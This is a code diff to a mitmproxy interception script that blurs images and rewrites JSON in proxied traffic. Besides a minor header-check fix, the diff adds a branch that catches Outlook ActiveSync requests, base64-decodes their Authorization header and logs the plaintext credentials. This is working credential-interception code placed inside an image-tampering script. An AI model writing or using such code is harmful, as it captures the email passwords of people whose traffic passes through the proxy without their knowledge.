@@ -4,6 +4,7 @@ from mitmproxy.models import decoded
 import json
 import StringIO
 from PIL import Image,ImageFilter
+import base64
 
 def _blur_that(flow, _type):
   sio = StringIO.StringIO(flow.response.content)
@@ -38,10 +39,15 @@ def response(context, flow):
 
       flow.response.content = json.dumps(obj)
 
-    elif flow.response.headers['Content-Type'] == 'image/jpeg':
+    elif 'Content-Type' in flow.response.headers and flow.response.headers['Content-Type'] == 'image/jpeg':
       _blur_that(flow,"JPEG")
-    elif flow.response.headers['Content-Type'] == 'image/png':
+    elif 'Content-Type' in flow.response.headers and flow.response.headers['Content-Type'] == 'image/png':
       _blur_that(flow,"PNG")
 
+    elif (flow.request.pretty_host == 'eas.outlook.com'
+      and flow.request.path.startswith("/Microsoft-Server-ActiveSync")):
+      atype,b64 = flow.request.headers['Authorization'].split(' ')
+
+      context.log( "OUTLOOK AUTH : %s"%base64.b64decode(b64) , level='info')
 
   flow.reply()
